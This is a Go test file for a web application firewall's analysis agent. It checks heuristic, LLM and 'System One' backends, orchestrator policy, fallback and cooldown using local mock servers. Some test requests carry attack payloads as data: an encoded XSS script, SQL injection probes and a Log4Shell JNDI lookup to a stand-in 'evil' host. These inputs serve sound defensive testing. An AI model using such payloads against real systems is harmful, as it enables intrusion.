// Test package agent: port dari tests/test_agent.py, test_llm.py,
// dan test_systemone.py (Python). Mock HTTP memakai httptest,
// bukan monkeypatch.
package agent

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/willy911/perisai-waf/internal/config"
	"github.com/willy911/perisai-waf/internal/rules"
	"github.com/willy911/perisai-waf/internal/storage"
)

// ---------- helper ----------

func testConfig() *config.WAFConfig {
	cfg := &config.WAFConfig{}
	cfg.Agent.Backend = "heuristic"
	cfg.Agent.MinConfidence = 0.55
	cfg.Thresholds.AgentScore = 25
	cfg.Thresholds.BlockScore = 60
	return cfg
}

func testRequest(path, query string, headers map[string]string, body string) *rules.Request {
	return &rules.Request{
		ID:       "req-test-1",
		Method:   "GET",
		Path:     path,
		Query:    query,
		Headers:  headers,
		Body:     []byte(body),
		ClientIP: "9.9.9.9",
	}
}

func testStorage(t *testing.T) *storage.Storage {
	t.Helper()
	s, err := storage.New(t.TempDir())
	if err != nil {
		t.Fatalf("storage.New: %v", err)
	}
	t.Cleanup(func() { s.Close() })
	return s
}

func triageOf(t *testing.T, cfg *config.WAFConfig, r *rules.Request) rules.TriageResult {
	t.Helper()
	return rules.NewEngine(cfg, nil).Triage(r)
}

func containsStr(list []string, sub string) bool {
	for _, s := range list {
		if strings.Contains(s, sub) {
			return true
		}
	}
	return false
}

// ---------- heuristic ----------

func TestHeuristicBlocksObfuscatedXSS(t *testing.T) {
	cfg := testConfig()
	r := testRequest("/cari", "q=%3C%53%63%52%69%70%54%3Ealert(1)%3C%2Fscript%3E",
		map[string]string{"user-agent": "Mozilla/5.0"}, "")
	tr := triageOf(t, cfg, r)
	v, err := NewHeuristicBackend().Analyze(r, tr)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if v.Decision != "block" {
		t.Fatalf("decision = %q, want block (indicators=%v)", v.Decision, v.Indicators)
	}
	if !containsStr(v.Indicators, "evasion") {
		t.Fatalf("tak ada indikator evasion: %v", v.Indicators)
	}
	if v.SuggestedRule == nil {
		t.Fatal("suggested_rule nil, want non-nil")
	}
}

func TestHeuristicChallengesSQLiProbe(t *testing.T) {
	cfg := testConfig()
	r := testRequest("/produk", "id=1%27%20OR%20%271%27%3D%271",
		map[string]string{"user-agent": "Mozilla/5.0"}, "")
	tr := triageOf(t, cfg, r)
	v, err := NewHeuristicBackend().Analyze(r, tr)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if v.Decision != "challenge" && v.Decision != "block" {
		t.Fatalf("decision = %q, want challenge|block", v.Decision)
	}
	if v.Confidence < 0.5 {
		t.Fatalf("confidence = %v, want >= 0.5", v.Confidence)
	}
}

func TestHeuristicAllowsBenign(t *testing.T) {
	cfg := testConfig()
	r := testRequest("/artikel", "slug=cara-memasak-rendang",
		map[string]string{"user-agent": "Mozilla/5.0"}, "")
	tr := triageOf(t, cfg, r)
	v, err := NewHeuristicBackend().Analyze(r, tr)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if v.Decision != "allow" {
		t.Fatalf("decision = %q, want allow (indicators=%v)", v.Decision, v.Indicators)
	}
}

// ---------- orkestrator: policy ----------

func TestOrchestratorNeverAllowsCritical(t *testing.T) {
	cfg := testConfig()
	store := testStorage(t)
	orch := NewOrchestrator(cfg, store)
	r := testRequest("/", "",
		map[string]string{"X-Foo": "${jndi:ldap://evil/x}"}, "")
	tr := triageOf(t, cfg, r)
	crit := false
	for _, h := range tr.Hits {
		if h.Severity == "critical" {
			crit = true
		}
	}
	if !crit {
		t.Fatalf("premise: tak ada hit critical dari engine: %+v", tr.Hits)
	}
	v, err := orch.Analyze(r, tr)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if v.Decision == "allow" {
		t.Fatal("orkestrator meng-allow temuan kritis")
	}
	// Tercatat di audit.
	runs, err := store.RecentAgentRuns(5)
	if err != nil {
		t.Fatalf("RecentAgentRuns: %v", err)
	}
	found := false
	for _, run := range runs {
		if run["request_id"] == r.ID {
			found = true
		}
	}
	if !found {
		t.Fatalf("run tak tercatat di audit: %v", runs)
	}
}

// weakBackend meniru WeakBackend di test Python: allow dengan confidence rendah.
type weakBackend struct{}

func (weakBackend) Name() string    { return "weak" }
func (weakBackend) Available() bool { return true }
func (weakBackend) Analyze(*rules.Request, rules.TriageResult) (Verdict, error) {
	return Verdict{Decision: "allow", Confidence: 0.1,
		Reasoning: []string{"ragu"}, Backend: "weak"}, nil
}

func TestOrchestratorLowConfidenceAllowBecomesChallenge(t *testing.T) {
	cfg := testConfig()
	orch := NewOrchestrator(cfg, testStorage(t))
	r := testRequest("/x", "q=' OR '1'='1",
		map[string]string{"user-agent": "t"}, "")
	tr := triageOf(t, cfg, r)
	raw, err := weakBackend{}.Analyze(r, tr)
	if err != nil {
		t.Fatalf("weak: %v", err)
	}
	v := orch.enforcePolicy(raw, tr)
	if v.Decision != "challenge" {
		t.Fatalf("decision = %q, want challenge", v.Decision)
	}
}

// ---------- LLM ----------

func llmTestServer(t *testing.T, content string) *httptest.Server {
	t.Helper()
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]any{
			"choices": []any{map[string]any{
				"message": map[string]any{"content": content}}},
		})
	}))
}

func llmBackendFor(url string) *LLMBackend {
	return NewLLMBackend(config.LLMConfig{
		BaseURL: url, APIKey: "test-key",
		Model: "cc/claude-sonnet-4-20250514", Timeout: 20,
	})
}

func TestLLMAnalyzeParsesJSON(t *testing.T) {
	verdictJSON, _ := json.Marshal(map[string]any{
		"decision": "block", "confidence": 0.92,
		"reasoning":      []string{"pola sqli jelas", "keyword union select"},
		"indicators":     []string{"sqli:union select"},
		"suggested_rule": nil,
	})
	srv := llmTestServer(t, string(verdictJSON))
	defer srv.Close()
	b := llmBackendFor(srv.URL)
	r := testRequest("/", "id=1 UNION SELECT x",
		map[string]string{"user-agent": "t"}, "")
	tr := rules.TriageResult{Score: 25}
	v, err := b.Analyze(r, tr)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if v.Decision != "block" || v.Confidence != 0.92 || v.Backend != "llm" {
		t.Fatalf("verdict = %+v", v)
	}
	if !containsStr(v.Indicators, "sqli:union select") {
		t.Fatalf("indicators = %v", v.Indicators)
	}
}

func TestLLMAnalyzeSanitizesUnknownDecision(t *testing.T) {
	srv := llmTestServer(t, `{"decision": "maybe", "confidence": 0.5}`)
	defer srv.Close()
	v, err := llmBackendFor(srv.URL).Analyze(
		testRequest("/", "", map[string]string{"user-agent": "t"}, ""),
		rules.TriageResult{})
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if v.Decision != "challenge" { // fallback aman
		t.Fatalf("decision = %q, want challenge", v.Decision)
	}
}

func TestLLMAnalyzeRaisesOnNonJSON(t *testing.T) {
	srv := llmTestServer(t, "maaf, saya tidak bisa")
	defer srv.Close()
	_, err := llmBackendFor(srv.URL).Analyze(
		testRequest("/", "", map[string]string{"user-agent": "t"}, ""),
		rules.TriageResult{})
	if err == nil {
		t.Fatal("want error untuk respons non-JSON")
	}
}

func TestLLMTestConnectionOK(t *testing.T) {
	srv := llmTestServer(t, "ok")
	defer srv.Close()
	res := llmBackendFor(srv.URL).TestConnection()
	if res["ok"] != true {
		t.Fatalf("ok = %v (%v)", res["ok"], res)
	}
	if res["model"] != "cc/claude-sonnet-4-20250514" {
		t.Fatalf("model = %v", res["model"])
	}
	if _, ok := res["latency_ms"]; !ok {
		t.Fatal("latency_ms hilang")
	}
}

func TestLLMTestConnectionFailure(t *testing.T) {
	srv := llmTestServer(t, "ok")
	url := srv.URL
	srv.Close() // paksa connection refused
	res := llmBackendFor(url).TestConnection()
	if res["ok"] != false {
		t.Fatalf("ok = %v, want false", res["ok"])
	}
	if res["error"] == nil || res["error"] == "" {
		t.Fatal("error kosong")
	}
}

func TestLLMBearerAuthHeaderSent(t *testing.T) {
	var gotAuth, gotPath string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotAuth = r.Header.Get("Authorization")
		gotPath = r.URL.Path
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]any{
			"choices": []any{map[string]any{
				"message": map[string]any{
					"content": `{"decision":"allow","confidence":0.9}`}}},
		})
	}))
	defer srv.Close()
	_, err := llmBackendFor(srv.URL).Analyze(
		testRequest("/", "", map[string]string{"user-agent": "t"}, ""),
		rules.TriageResult{})
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if gotAuth != "Bearer test-key" {
		t.Fatalf("Authorization = %q", gotAuth)
	}
	if gotPath != "/chat/completions" {
		t.Fatalf("path = %q", gotPath)
	}
}

func TestFetchModels(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/models" {
			t.Errorf("path = %q", r.URL.Path)
		}
		json.NewEncoder(w).Encode(map[string]any{"data": []any{
			map[string]any{"id": "b-model", "owned_by": "x"},
			map[string]any{"id": "a-model", "owned_by": "y"},
			map[string]any{"owned_by": "tanpa-id"}, // dilewati
		}})
	}))
	defer srv.Close()
	models, err := FetchModels(srv.URL, "k")
	if err != nil {
		t.Fatalf("FetchModels: %v", err)
	}
	if len(models) != 2 || models[0]["id"] != "a-model" || models[1]["id"] != "b-model" {
		t.Fatalf("models = %v (want terurut a,b)", models)
	}

	// Respons bukan format OpenAI.
	srv2 := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode(map[string]any{"foo": 1})
	}))
	defer srv2.Close()
	if _, err := FetchModels(srv2.URL, ""); err == nil ||
		!strings.Contains(err.Error(), "bukan format OpenAI") {
		t.Fatalf("want error format OpenAI, got %v", err)
	}
}

// ---------- System One ----------

func TestParseNoulPrefersRaw(t *testing.T) {
	p, err := ParseNoul(map[string]any{"type": "noul", "noul": 0.82, "noul_raw": 0.61})
	if err != nil || p != 0.61 {
		t.Fatalf("p=%v err=%v", p, err)
	}
}

func TestParseNoulFallbackNoul(t *testing.T) {
	p, err := ParseNoul(map[string]any{"type": "noul", "noul": 0.9})
	if err != nil || p != 0.9 {
		t.Fatalf("p=%v err=%v", p, err)
	}
}

func TestParseNoulClamped(t *testing.T) {
	if p, _ := ParseNoul(map[string]any{"noul": 2.5}); p != 1.0 {
		t.Fatalf("p=%v", p)
	}
	if p, _ := ParseNoul(map[string]any{"noul": -1}); p != 0.0 {
		t.Fatalf("p=%v", p)
	}
}

func TestParseNoulMissingRaises(t *testing.T) {
	if _, err := ParseNoul(map[string]any{"type": "noul"}); err == nil {
		t.Fatal("want error")
	}
	if _, err := ParseNoul(map[string]any{}); err == nil {
		t.Fatal("want error")
	}
	if _, err := ParseNoul(nil); err == nil {
		t.Fatal("want error untuk nil")
	}
}

// s1TestServer membuat fake endpoint /v1/systemone yang mencatat request.
type s1Call struct {
	auth, contentType string
	body              map[string]any
}

func s1TestServer(t *testing.T, status int, payload any, notJSON bool, calls *[]s1Call) *httptest.Server {
	t.Helper()
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var body map[string]any
		json.NewDecoder(r.Body).Decode(&body)
		*calls = append(*calls, s1Call{
			auth:        r.Header.Get("Authorization"),
			contentType: r.Header.Get("Content-Type"),
			body:        body,
		})
		if notJSON {
			w.Write([]byte("bukan json"))
			return
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(status)
		json.NewEncoder(w).Encode(payload)
	}))
}

func s1Answers(p float64, withRaw bool) map[string]any {
	ans := map[string]any{"type": "noul", "noul": p}
	if withRaw {
		ans["noul_raw"] = p
	}
	return map[string]any{"model": "oc/jev-1.13-free",
		"answers": map[string]any{"is_attack": ans}}
}

func s1BackendFor(url string) *SystemOneBackend {
	return NewSystemOneBackend(config.SystemOneConfig{
		Enabled: true, Endpoint: url, APIKey: "KUNCI",
		Model: "oc/jev-1.13-free", Timeout: 10,
	})
}

func TestQueryPayloadShape(t *testing.T) {
	var calls []s1Call
	srv := s1TestServer(t, 200, s1Answers(0.1, true), false, &calls)
	defer srv.Close()
	b := s1BackendFor(srv.URL)
	answers, err := b.Query(map[string]any{"method": "GET"},
		map[string]any{"is_attack": map[string]any{"type": "noul", "instructions": "x?"}}, 0)
	if err != nil {
		t.Fatalf("Query: %v", err)
	}
	if _, ok := answers["is_attack"]; !ok {
		t.Fatalf("answers = %v", answers)
	}
	c := calls[0]
	if c.auth != "Bearer KUNCI" {
		t.Fatalf("auth = %q", c.auth)
	}
	if c.contentType != "application/json" {
		t.Fatalf("content-type = %q", c.contentType)
	}
	if c.body["model"] != "oc/jev-1.13-free" {
		t.Fatalf("model = %v", c.body["model"])
	}
	state, _ := c.body["state"].(map[string]any)
	if state["method"] != "GET" {
		t.Fatalf("state = %v", c.body["state"])
	}
	qs, _ := c.body["questions"].(map[string]any)
	q, _ := qs["is_attack"].(map[string]any)
	if q["type"] != "noul" {
		t.Fatalf("questions = %v", qs)
	}
}

func TestQueryHTTPErrorSurfacesMessage(t *testing.T) {
	var calls []s1Call
	srv := s1TestServer(t, 401,
		map[string]any{"error": "API key required for remote API access"}, false, &calls)
	defer srv.Close()
	_, err := s1BackendFor(srv.URL).Query("x",
		map[string]any{"q": map[string]any{"type": "noul", "instructions": "y?"}}, 0)
	if err == nil || !strings.Contains(err.Error(), "API key required") {
		t.Fatalf("err = %v", err)
	}
}

func TestQueryNonJSONRaises(t *testing.T) {
	var calls []s1Call
	srv := s1TestServer(t, 200, nil, true, &calls)
	defer srv.Close()
	_, err := s1BackendFor(srv.URL).Query("x",
		map[string]any{"q": map[string]any{"type": "noul", "instructions": "y?"}}, 0)
	if err == nil || !strings.Contains(err.Error(), "bukan JSON") {
		t.Fatalf("err = %v", err)
	}
}

func TestQueryMissingAnswersRaises(t *testing.T) {
	var calls []s1Call
	srv := s1TestServer(t, 200, map[string]any{"model": "m"}, false, &calls)
	defer srv.Close()
	_, err := s1BackendFor(srv.URL).Query("x",
		map[string]any{"q": map[string]any{"type": "noul", "instructions": "y?"}}, 0)
	if err == nil || !strings.Contains(err.Error(), "tanpa field 'answers'") {
		t.Fatalf("err = %v", err)
	}
}

func TestQueryConnError(t *testing.T) {
	b := s1BackendFor("http://127.0.0.1:1/v1/systemone")
	_, err := b.Query("x",
		map[string]any{"q": map[string]any{"type": "noul", "instructions": "y?"}}, 2)
	if err == nil || !strings.Contains(err.Error(), "tidak bisa menghubungi") {
		t.Fatalf("err = %v", err)
	}
}

func benignCtx(t *testing.T) (*rules.Request, rules.TriageResult) {
	t.Helper()
	cfg := testConfig()
	r := testRequest("/artikel", "slug=cara-memasak-rendang",
		map[string]string{"user-agent": "Mozilla/5.0"}, "")
	return r, triageOf(t, cfg, r)
}

func TestAnalyzeBlock(t *testing.T) {
	var calls []s1Call
	srv := s1TestServer(t, 200, s1Answers(0.93, true), false, &calls)
	defer srv.Close()
	r, tr := benignCtx(t)
	v, err := s1BackendFor(srv.URL).Analyze(r, tr)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if v.Decision != "block" || v.Backend != "systemone" {
		t.Fatalf("verdict = %+v", v)
	}
	if v.Confidence < 0.929 || v.Confidence > 0.931 {
		t.Fatalf("confidence = %v", v.Confidence)
	}
	if !containsStr(v.Indicators, "is_attack=0.93") {
		t.Fatalf("indicators = %v", v.Indicators)
	}
}

func TestAnalyzeChallenge(t *testing.T) {
	var calls []s1Call
	srv := s1TestServer(t, 200, s1Answers(0.7, true), false, &calls)
	defer srv.Close()
	r, tr := benignCtx(t)
	v, err := s1BackendFor(srv.URL).Analyze(r, tr)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if v.Decision != "challenge" {
		t.Fatalf("decision = %q", v.Decision)
	}
	if v.Confidence < 0.699 || v.Confidence > 0.701 {
		t.Fatalf("confidence = %v", v.Confidence)
	}
}

func TestAnalyzeAllow(t *testing.T) {
	var calls []s1Call
	srv := s1TestServer(t, 200, s1Answers(0.2, true), false, &calls)
	defer srv.Close()
	r, tr := benignCtx(t)
	v, err := s1BackendFor(srv.URL).Analyze(r, tr)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if v.Decision != "allow" {
		t.Fatalf("decision = %q", v.Decision)
	}
	if v.Confidence < 0.799 || v.Confidence > 0.801 { // 1 - p
		t.Fatalf("confidence = %v", v.Confidence)
	}
}

func TestAnalyzeMinConfidenceLive(t *testing.T) {
	var calls []s1Call
	srv := s1TestServer(t, 200, s1Answers(0.6, true), false, &calls)
	defer srv.Close()
	b := s1BackendFor(srv.URL)
	b.MinConfidence = 0.7
	r, tr := benignCtx(t)
	v, err := b.Analyze(r, tr)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if v.Decision != "allow" { // 0.6 < 0.7
		t.Fatalf("decision = %q, want allow", v.Decision)
	}
}

func TestAvailable(t *testing.T) {
	b := s1BackendFor("https://s1.test/v1/systemone")
	if !b.Available() {
		t.Fatal("want available")
	}
	b.cfg.Enabled = false
	if b.Available() {
		t.Fatal("want unavailable saat disabled")
	}
	b.cfg.Enabled = true
	b.cfg.Endpoint = ""
	if b.Available() {
		t.Fatal("want unavailable saat endpoint kosong")
	}
	var l *LLMBackend = NewLLMBackend(config.LLMConfig{})
	if l.Available() {
		t.Fatal("LLM tanpa base_url harus unavailable")
	}
	l2 := NewLLMBackend(config.LLMConfig{BaseURL: "http://x/v1"})
	if !l2.Available() {
		t.Fatal("LLM dengan base_url harus available")
	}
}

func TestSystemOneTestConnectionOK(t *testing.T) {
	var calls []s1Call
	srv := s1TestServer(t, 200, map[string]any{"model": "m",
		"answers": map[string]any{"ping": map[string]any{"type": "noul", "noul": 0.95}}},
		false, &calls)
	defer srv.Close()
	res := s1BackendFor(srv.URL).TestConnection()
	if res["ok"] != true || res["model"] != "oc/jev-1.13-free" {
		t.Fatalf("res = %v", res)
	}
	if _, ok := res["latency_ms"]; !ok {
		t.Fatal("latency_ms hilang")
	}
}

func TestSystemOneTestConnectionFail(t *testing.T) {
	var calls []s1Call
	srv := s1TestServer(t, 401,
		map[string]any{"error": "API key required for remote API access"}, false, &calls)
	defer srv.Close()
	res := s1BackendFor(srv.URL).TestConnection()
	if res["ok"] != false {
		t.Fatalf("ok = %v", res["ok"])
	}
	if !strings.Contains(res["error"].(string), "API key required") {
		t.Fatalf("error = %v", res["error"])
	}
}

// ---------- orkestrator: rantai backend ----------

func orchCfgSystemOne(url string) *config.WAFConfig {
	cfg := testConfig()
	cfg.Agent.Backend = "systemone"
	cfg.Agent.SystemOne = config.SystemOneConfig{
		Enabled: true, Endpoint: url, APIKey: "KUNCI",
		Model: "oc/jev-1.13-free", Timeout: 10,
	}
	return cfg
}

func TestOrchestratorUsesSystemOne(t *testing.T) {
	var nCalls int64
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt64(&nCalls, 1)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(s1Answers(0.95, true))
	}))
	defer srv.Close()
	orch := NewOrchestrator(orchCfgSystemOne(srv.URL), testStorage(t))
	r, tr := benignCtx(t)
	v, err := orch.Analyze(r, tr)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if v.Backend != "systemone" || v.Decision != "block" {
		t.Fatalf("verdict = %+v", v)
	}
	if atomic.LoadInt64(&nCalls) == 0 {
		t.Fatal("endpoint tak pernah dipanggil")
	}
}

func TestOrchestratorFallbackToHeuristic(t *testing.T) {
	var nCalls int64
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt64(&nCalls, 1)
	}))
	url := srv.URL
	srv.Close() // paksa connection refused
	orch := NewOrchestrator(orchCfgSystemOne(url), testStorage(t))
	r, tr := benignCtx(t)
	v, err := orch.Analyze(r, tr)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if v.Backend != "heuristic" {
		t.Fatalf("backend = %q, want heuristic", v.Backend)
	}
	if !containsStr(v.Reasoning, "Fallback: backend systemone") {
		t.Fatalf("reasoning = %v", v.Reasoning)
	}
	// Cooldown aktif -> request berikutnya langsung heuristic tanpa HTTP.
	v2, err := orch.Analyze(r, tr)
	if err != nil {
		t.Fatalf("Analyze2: %v", err)
	}
	if v2.Backend != "heuristic" {
		t.Fatalf("backend2 = %q", v2.Backend)
	}
	if atomic.LoadInt64(&nCalls) != 0 {
		t.Fatalf("nCalls = %d, want 0 (cooldown)", nCalls)
	}
}

func TestOrchestratorAutoChainOrder(t *testing.T) {
	cfg := testConfig()
	cfg.Agent.Backend = "auto"
	cfg.Agent.LLM = config.LLMConfig{BaseURL: "http://127.0.0.1:20127/v1", Timeout: 20}
	cfg.Agent.SystemOne = config.SystemOneConfig{
		Enabled: true, Endpoint: "https://s1.test/v1/systemone", Timeout: 10}
	orch := NewOrchestrator(cfg, testStorage(t))
	var order []string
	for _, b := range orch.candidates() {
		order = append(order, b.Name())
	}
	if len(order) != 3 || order[0] != "systemone" || order[2] != "heuristic" {
		t.Fatalf("order = %v", order)
	}
	if order[1] != "llm" {
		t.Fatalf("order = %v, want [systemone llm heuristic]", order)
	}
}

func TestOrchestratorExplicitSystemOneModeFallsBack(t *testing.T) {
	cfg := testConfig()
	cfg.Agent.Backend = "systemone"
	cfg.Agent.SystemOne = config.SystemOneConfig{Enabled: true, Endpoint: ""} // tak terkonfigurasi
	orch := NewOrchestrator(cfg, testStorage(t))
	r, tr := benignCtx(t)
	v, err := orch.Analyze(r, tr)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if v.Backend != "heuristic" {
		t.Fatalf("backend = %q, want heuristic", v.Backend)
	}
}

func TestOrchestratorTestSystemOne(t *testing.T) {
	var calls []s1Call
	srv := s1TestServer(t, 200, map[string]any{"model": "m",
		"answers": map[string]any{"ping": map[string]any{"type": "noul", "noul": 0.9}}},
		false, &calls)
	defer srv.Close()
	orch := NewOrchestrator(orchCfgSystemOne(srv.URL), testStorage(t))
	res := orch.TestSystemOne()
	if res["ok"] != true || res["backend"] != "systemone" {
		t.Fatalf("res = %v", res)
	}
	if _, ok := res["endpoint"]; !ok {
		t.Fatal("endpoint hilang")
	}
}

func TestOrchestratorTestLLM(t *testing.T) {
	srv := llmTestServer(t, "ok")
	defer srv.Close()
	cfg := testConfig()
	cfg.Agent.LLM = config.LLMConfig{BaseURL: srv.URL, Model: "m", Timeout: 20}
	orch := NewOrchestrator(cfg, testStorage(t))
	res := orch.TestLLM()
	if res["ok"] != true || res["backend"] != "llm" {
		t.Fatalf("res = %v", res)
	}
	if res["base_url"] != srv.URL {
		t.Fatalf("base_url = %v", res["base_url"])
	}
}

// ---------- regresi byte-identical vs Python ----------

func TestSystemPromptByteIdentical(t *testing.T) {
	golden, err := os.ReadFile(filepath.Join("testdata", "system_prompt.txt"))
	if err != nil {
		t.Fatalf("baca golden: %v", err)
	}
	if SystemPrompt != string(golden) {
		t.Fatal("SystemPrompt menyimpang dari perisai/agent/llm.py")
	}
}

func TestQuestionIsAttackIdentical(t *testing.T) {
	golden, err := os.ReadFile(filepath.Join("testdata", "question_is_attack.json"))
	if err != nil {
		t.Fatalf("baca golden: %v", err)
	}
	var want map[string]any
	if err := json.Unmarshal(golden, &want); err != nil {
		t.Fatalf("unmarshal golden: %v", err)
	}
	gotRaw, _ := json.Marshal(QuestionIsAttack)
	var got map[string]any
	json.Unmarshal(gotRaw, &got)
	wantRaw, _ := json.Marshal(want)
	if string(gotRaw) != string(wantRaw) {
		t.Fatalf("QuestionIsAttack menyimpang:\n got=%s\nwant=%s", gotRaw, wantRaw)
	}
}
